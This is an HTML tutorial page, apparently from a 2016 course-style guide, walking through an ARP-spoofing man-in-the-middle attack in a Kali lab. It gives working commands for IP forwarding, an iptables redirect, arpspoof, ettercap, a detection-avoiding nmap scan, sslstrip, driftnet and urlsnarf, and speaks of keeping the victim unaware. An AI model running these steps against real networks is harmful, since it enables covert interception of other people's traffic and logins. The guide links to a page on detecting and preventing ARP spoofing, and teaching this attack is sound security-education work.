@@ -1,0 +1,338 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>Performing the spoof attack &mdash; arp 1.0 documentation</title>
+  
+
+  
+  
+
+  
+
+  
+  
+    
+
+  
+
+  
+  
+    <link rel="stylesheet" href="_static/css/theme.css" type="text/css" />
+  
+
+  
+
+  
+    <link rel="top" title="arp 1.0 documentation" href="index.html"/>
+        <link rel="next" title="How to detect and prevent ARP spoofing" href="prevention.html"/>
+        <link rel="prev" title="Getting Virtualbox Set Up" href="vbox.html"/> 
+
+  
+  <script src="_static/js/modernizr.min.js"></script>
+
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search">
+          
+
+          
+            <a href="index.html" class="icon icon-home"> arp
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                1.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+                <ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="vbox.html">Getting Virtualbox Set Up</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">Performing the spoof attack</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#setup-and-components">Setup and components</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#tools-used">Tools used</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#notes-and-preparation">Notes and Preparation</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#enable-forwarding-and-redirection">Enable forwarding and redirection</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#start-ettercap-or-wait-if-using-arpspoof">Start Ettercap (OR wait if using arpspoof)</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#scan-the-network-and-choose-hosts">Scan the network and choose hosts</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#using-ettercap">Using Ettercap</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#using-nmap">Using Nmap</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#adding-hosts">Adding hosts</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#arpspoof">Arpspoof</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#start-sslstrip">Start sslstrip</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#viewing-user-activity-other-commands-optional">Viewing user activity: other commands (optional)</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="prevention.html">How to detect and prevent ARP spoofing</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+        <a href="index.html">arp</a>
+      </nav>
+
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          
+
+ 
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="index.html">Docs</a> &raquo;</li>
+      
+    <li>Performing the spoof attack</li>
+      <li class="wy-breadcrumbs-aside">
+        
+          
+            <a href="_sources/attack.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="performing-the-spoof-attack">
+<h1>Performing the spoof attack<a class="headerlink" href="#performing-the-spoof-attack" title="Permalink to this headline">¶</a></h1>
+<p>Note: Change any names of interfaces (e.g. eth0) to whatever interface you&#8217;re actually on in Kali, which will be different if you&#8217;re using a native OS and not a VM. Also obviously change IP adresses to match your configs.</p>
+<div class="section" id="setup-and-components">
+<h2>Setup and components<a class="headerlink" href="#setup-and-components" title="Permalink to this headline">¶</a></h2>
+<p>You need the following things:
+* Kali VM or physical machine <strong>*on same network as router*</strong> (see below)
+* Some other VM or physical machine <strong>*on same network*</strong></p>
+<p>To put VMs on the same network as your router (i.e. so they have internet access) you have to use Bridged Adapters in VirtualBox. See our page on <a class="reference internal" href="vbox.html"><span class="doc">Getting Virtualbox Set Up</span></a>.</p>
+<div class="admonition warning">
+<p class="first admonition-title">Warning</p>
+<p>Windows 8-10 users:</p>
+<p class="last"><em>If you have no options under “bridged adapter”, similar to what is shown below, you have to follow instructions from the site below to disable Driver Signature Enforcement then reinstall VirtualBox. You can always re-enable it afterwards.</em></p>
+</div>
+<div class="figure align-center">
+<img alt="_images/bridged.png" src="_images/bridged.png" />
+</div>
+<p><a class="reference external" href="http://www.drivethelife.com/windows-drivers/how-to-disable-driver-signature-enforcement-on-windows-10-8-7-xp-vista.html">Driver Signature Enforcement</a></p>
+<div class="section" id="tools-used">
+<h3>Tools used<a class="headerlink" href="#tools-used" title="Permalink to this headline">¶</a></h3>
+<ul class="simple">
+<li>Ettercap (could also use arpspoof, a command line tool)</li>
+<li>driftnet (for entertainment... shows the images the person is using)</li>
+<li>urlsnarf (get a list of URLs they visit)</li>
+<li>sslstrip (doesn&#8217;t always work because of HSTS headers but we can try)</li>
+</ul>
+</div>
+<div class="section" id="notes-and-preparation">
+<h3>Notes and Preparation<a class="headerlink" href="#notes-and-preparation" title="Permalink to this headline">¶</a></h3>
+<p>As always, it is best to actually understand what you&#8217;re doing, so if you don&#8217;t know the difference between an IP address and a MAC/hardware address and what protocols are associated with each. Good references:</p>
+<ul class="simple">
+<li><a class="reference external" href="http://www.webopedia.com/quick_ref/OSI_Layers.asp">http://www.webopedia.com/quick_ref/OSI_Layers.asp</a></li>
+<li><a class="reference external" href="https://www.tummy.com/articles/networking-basics-how-arp-works/">https://www.tummy.com/articles/networking-basics-how-arp-works/</a></li>
+<li><a class="reference external" href="http://www.tldp.org/LDP/nag/node78.html">http://www.tldp.org/LDP/nag/node78.html</a></li>
+</ul>
+</div>
+<div class="section" id="enable-forwarding-and-redirection">
+<h3>Enable forwarding and redirection<a class="headerlink" href="#enable-forwarding-and-redirection" title="Permalink to this headline">¶</a></h3>
+<p>If you don&#8217;t want your victim knowing he&#8217;s getting attacked or shutting his computer off because &#8220;the internet broke&#8221; you need to forward his traffic both ways. To do this, you have to enable forwarding like so:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">#</span> <span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/net/ipv4/ip_forward
+</pre></div>
+</div>
+<p>You&#8217;ll also want to strip ssl certs from traffic by redirecting encrypted traffic to a different port, which sslstrip will use, using iptables:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">#</span> iptables -t nat -A PREROUTING -i %iface -p tcp --dport <span class="m">80</span> -j REDIRECT --to-port 8080
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="start-ettercap-or-wait-if-using-arpspoof">
+<h2>Start Ettercap (OR wait if using arpspoof)<a class="headerlink" href="#start-ettercap-or-wait-if-using-arpspoof" title="Permalink to this headline">¶</a></h2>
+<p>Skip to &#8220;Scan the network&#8221; if using the CLI arpspoof tool instead.</p>
+<p>Start Ettercap using the following command:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">#</span> ettercap -G
+</pre></div>
+</div>
+</div>
+<div class="section" id="scan-the-network-and-choose-hosts">
+<h2>Scan the network and choose hosts<a class="headerlink" href="#scan-the-network-and-choose-hosts" title="Permalink to this headline">¶</a></h2>
+<p>In order to determine who your victim is, you&#8217;ll need to scan your network. There are two ways to do this. The first is using nmap, which is the most popular scanning tool out there. It is extremely versatile and has several customization options. The second is using Ettercap itself.</p>
+<div class="section" id="using-ettercap">
+<h3>Using Ettercap<a class="headerlink" href="#using-ettercap" title="Permalink to this headline">¶</a></h3>
+<p>Begin Unified Sniffing and scan for hosts.</p>
+<div class="figure align-center">
+<img alt="_images/e1.PNG" src="_images/e1.PNG" />
+</div>
+<div class="figure align-center">
+<img alt="_images/e2.PNG" src="_images/e2.PNG" />
+</div>
+</div>
+<div class="section" id="using-nmap">
+<h3>Using Nmap<a class="headerlink" href="#using-nmap" title="Permalink to this headline">¶</a></h3>
+<p>If you want to use nmap, you can do a basic scan of your network without any options. However, it&#8217;s probably best to also take some steps to avoid detection. You can use the -sn option to ONLY scan for hosts without scanning for open ports, which will generate less traffic (and make for a faster scan). You can also use the -T paranoid|sneaky option to wait between scans to avoid detection See the <a class="reference external" href="https://nmap.org/book/man-performance.html">Timing and Performance</a> section of nmap&#8217;s man page as well as the <a class="reference external" href="https://nmap.org/book/man-host-discovery.html">Host Discovery</a> section (and any others that interst you :))</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">#</span> nmap -sS -sn -T sneaky 192.168.1.0/24
+</pre></div>
+</div>
+</div>
+<div class="section" id="adding-hosts">
+<h3>Adding hosts<a class="headerlink" href="#adding-hosts" title="Permalink to this headline">¶</a></h3>
+<p>If using Ettercap and you used Ettercap&#8217;s built in scan tool, go to the Hosts List and add the router and your victim to Target 1 and Target 2.</p>
+<div class="figure align-center">
+<img alt="_images/e3.PNG" src="_images/e3.PNG" />
+</div>
+<p>If you used Nmap, you&#8217;ll have to manually enter them in the Targets section of Ettercap, or use arpspoof below.</p>
+</div>
+</div>
+<div class="section" id="arpspoof">
+<h2>Arpspoof<a class="headerlink" href="#arpspoof" title="Permalink to this headline">¶</a></h2>
+<p>Start arpspoof</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">#</span> arpspoof -i eth0 -t <span class="o">[</span>ip_victim<span class="o">]</span> <span class="o">[</span>ip_router<span class="o">]</span>
+<span class="gp">#</span> arpspoof -i eth0 -t <span class="o">[</span>ip_router<span class="o">]</span> <span class="o">[</span>ip_victim<span class="o">]</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="start-sslstrip">
+<h2>Start sslstrip<a class="headerlink" href="#start-sslstrip" title="Permalink to this headline">¶</a></h2>
+<p>You&#8217;ll want to use sslstrip to strip what traffic you can. Since we redirected traffic to 8080 earlier, tell it to listen to 8080 using this command:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">#</span> sslstrip -l <span class="m">8080</span> -w /root/Desktop/sslstriplog
+</pre></div>
+</div>
+</div>
+<div class="section" id="viewing-user-activity-other-commands-optional">
+<h2>Viewing user activity: other commands (optional)<a class="headerlink" href="#viewing-user-activity-other-commands-optional" title="Permalink to this headline">¶</a></h2>
+<p>If you want to use driftnet and urlsnarf to look at their pictures and stuff, open up 2 new tabs with Ctrl+Shift+T and have these commands ready:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">#</span> driftnet -i eth0
+<span class="gp">#</span> urlsnarf -i eth0 &gt; /root/Desktop/urllog
+</pre></div>
+</div>
+<div class="figure align-center">
+<img alt="_images/e4.PNG" src="_images/e4.PNG" />
+</div>
+<div class="figure align-center">
+<img alt="_images/e_urllog.PNG" src="_images/e_urllog.PNG" />
+</div>
+<p>Make sure to stop the attack properly using Ettercap! It will &#8220;unspoof&#8221; things for you</p>
+<div class="figure align-center">
+<img alt="_images/estop.PNG" src="_images/estop.PNG" />
+</div>
+</div>
+</div>
+
+
+           </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="prevention.html" class="btn btn-neutral float-right" title="How to detect and prevent ARP spoofing" accesskey="n">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="vbox.html" class="btn btn-neutral" title="Getting Virtualbox Set Up" accesskey="p"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2016, Squiggles.
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  
+
+    <script type="text/javascript">
+        var DOCUMENTATION_OPTIONS = {
+            URL_ROOT:'./',
+            VERSION:'1.0',
+            COLLAPSE_INDEX:false,
+            FILE_SUFFIX:'.html',
+            HAS_SOURCE:  true
+        };
+    </script>
+      <script type="text/javascript" src="_static/jquery.js"></script>
+      <script type="text/javascript" src="_static/underscore.js"></script>
+      <script type="text/javascript" src="_static/doctools.js"></script>
+
+  
+
+  
+  
+    <script type="text/javascript" src="_static/js/theme.js"></script>
+  
+
+  
+  
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.StickyNav.enable();
+      });
+  </script>
+   
+
+</body>
+</html>
